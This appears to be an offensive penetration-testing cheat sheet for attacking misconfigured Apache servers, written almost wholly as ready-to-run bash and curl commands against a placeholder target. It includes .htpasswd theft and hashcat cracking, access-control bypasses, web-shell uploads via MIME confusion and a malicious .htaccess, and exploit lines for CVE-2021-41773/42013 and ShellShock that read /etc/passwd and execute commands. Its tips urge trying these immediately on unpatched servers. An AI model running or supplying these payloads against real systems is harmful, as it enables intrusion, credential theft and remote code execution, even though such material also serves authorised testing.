# Apache Misconfiguration — mod_status, Directory Listing, .htaccess, mod_rewrite Bypass

Common Apache HTTP Server misconfigurations that expose sensitive info or bypass access controls.

## Phase 1: Detection & Fingerprinting

```bash
# Identify Apache version:
curl -s -I "https://target.com/" | grep -i "server:"
curl -s -I "https://target.com/nonexistent" | grep "Apache"

# Check for version disclosure in error pages:
curl -s "https://target.com/nonexistent_12345" | grep -i "apache"

# Enumerate Apache modules via server headers:
curl -s -I "https://target.com/" | grep -i "x-powered-by\|x-mod\|mod_"
```

---

## Phase 2: mod_status Exposure

```bash
# Apache server-status — exposes live requests, IPs, URLs:
for path in /server-status /server-status?full /apache-status \
            /status /server_status; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  if [ "$STATUS" = "200" ]; then
    echo "EXPOSED: $path"
    curl -s "https://target.com$path" | grep -oE 'GET|POST|HEAD|[A-Z]{3,8}[^<]+' | head -20
  fi
done

# Extract URLs from server-status:
curl -s "https://target.com/server-status?full" | \
  grep -oE 'https?://[^"<>]+' | sort -u

# mod_info exposure:
curl -s "https://target.com/server-info" | head -50
```

---

## Phase 3: Directory Listing

```bash
# Check directories with likely listing enabled:
for dir in /uploads /images /files /backup /static /logs /temp /tmp /cache; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$dir/")
  if [ "$STATUS" = "200" ]; then
    echo "Listing at $dir/"
    curl -s "https://target.com$dir/" | grep -oE 'href="[^"]+"' | grep -v "Parent\|\.\." | head -10
  fi
done

# Recursive directory discovery with listing:
curl -s "https://target.com/backup/" | grep -oE '"[^"]+\.(sql|zip|tar|gz|bak|old)"'
```

---

## Phase 4: .htaccess / .htpasswd Exposure

```bash
# Direct access to .htaccess (should return 403 normally):
curl -s "https://target.com/.htaccess"
curl -s "https://target.com/.htpasswd"
curl -s "https://target.com/.htaccess.bak"
curl -s "https://target.com/.htpasswd.bak"

# Check parent directories:
for dir in "" /app /web /public /html /www /site; do
  for file in .htaccess .htpasswd .htaccess.bak .htpasswd.bak; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$dir/$file")
    [ "$STATUS" = "200" ] && curl -s "https://target.com$dir/$file"
  done
done

# Crack htpasswd:
# Format: user:$apr1$salt$hash
hashcat -m 1600 htpasswd_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 5: mod_rewrite Bypass

```bash
# Bypass .htaccess rules with case manipulation (case-insensitive FS):
curl -s "https://target.com/Admin"
curl -s "https://target.com/ADMIN"
curl -s "https://target.com/aDmIn"

# Bypass with trailing characters:
curl -s "https://target.com/admin."
curl -s "https://target.com/admin/"
curl -s "https://target.com/admin%20"
curl -s "https://target.com/admin%09"  # tab

# Bypass with path encoding:
curl -s "https://target.com/%61dmin"   # 'a' encoded
curl -s "https://target.com/%2Fadmin"

# Double encoding:
curl -s "https://target.com/%252fadmin"

# Test common blocked extensions bypass:
# .php blocked → try:
curl -s "https://target.com/shell.php5"
curl -s "https://target.com/shell.php7"
curl -s "https://target.com/shell.phtml"
curl -s "https://target.com/shell.phar"
curl -s "https://target.com/shell.phps"
curl -s "https://target.com/shell.pHp"   # case
```

---

## Phase 6: File Upload Bypass (Apache MIME Confusion)

```bash
# Upload file with .php extension disguised as image:
curl -s -X POST "https://target.com/upload" \
  -H "Cookie: SESSION" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.jpg.php"

# Apache parses extensions right-to-left for some configs:
# file.php.jpg → Apache may still execute as PHP if jpg not mapped
curl -s -X POST "https://target.com/upload" \
  -H "Cookie: SESSION" \
  -F "file=@webshell.php.jpg"

# Null byte (old Apache versions):
curl -s "https://target.com/include?file=shell.php%00.jpg"

# .htaccess upload → configure PHP execution in upload dir:
# Upload .htaccess containing: AddType application/x-httpd-php .jpg
printf 'AddType application/x-httpd-php .jpg\n' > malicious.htaccess
curl -s -X POST "https://target.com/upload" \
  -H "Cookie: SESSION" \
  -F "file=@malicious.htaccess;filename=.htaccess"
# Then upload shell.jpg (PHP code with .jpg extension)
```

---

## Phase 7: Apache Vulnerabilities by Version

```bash
# Detect Apache version:
VERSION=$(curl -s -I "https://target.com/" | grep -i "Server:" | grep -oE 'Apache/[0-9.]+')
echo "Detected: $VERSION"

# Check version against known CVEs:
# Apache 2.4.49 — CVE-2021-41773 (Path Traversal + RCE):
curl -s "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl -s "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"

# Apache 2.4.50 — CVE-2021-42013 (bypass of 41773):
curl -s "https://target.com/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"

# Apache 2.4.0-2.4.29 — CVE-2017-7679 (mod_mime buffer overread):
# Apache 2.2.x — CVE-2012-0053 (httpOnly cookie bypass):

# ShellShock (CGI on Apache):
curl -s "https://target.com/cgi-bin/test.cgi" \
  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'
```

---

## Phase 8: Common Exposed Files

```bash
# Check for sensitive files exposed under Apache:
COMMON_FILES=(
  "/.env" "/.env.local" "/.env.production"
  "/config.php" "/config.php.bak" "/wp-config.php.bak"
  "/database.yml" "/settings.py" "/application.yml"
  "/.git/config" "/.git/HEAD"
  "/backup.zip" "/backup.sql" "/db.sql"
  "/phpinfo.php" "/info.php" "/test.php" "/php.php"
  "/robots.txt" "/sitemap.xml" "/crossdomain.xml"
  "/.DS_Store" "/Thumbs.db"
)

for file in "${COMMON_FILES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$file")
  [ "$STATUS" = "200" ] && echo "EXPOSED $STATUS: $file"
done
```

---

## Pro Tips

1. **server-status first** — exposes live user sessions (URLs with tokens), internal IPs, admin paths being accessed
2. **CVE-2021-41773/42013** — still unpatched on many servers; try immediately on Apache 2.4.49-50
3. **ShellShock** — check ALL CGI endpoints (`.cgi`, `.pl`, `.sh`); inject in all headers
4. **Upload + .htaccess** — if you can upload .htaccess, you can execute arbitrary PHP via MIME override
5. **Directory listing in /backup** — often contains .sql dump files with all user credentials
6. **Case sensitivity** — Linux is case-sensitive but Apache rewrite rules may not be; try `/Admin`, `/ADMIN`

## Summary

Apache misconfig flow: check server-status/server-info → test directory listing on common dirs → check .htaccess/.htpasswd direct access → test mod_rewrite bypass (case, encoding) → check Apache version for 2.4.49/50 path traversal → ShellShock on CGI endpoints → look for exposed backup/config files.
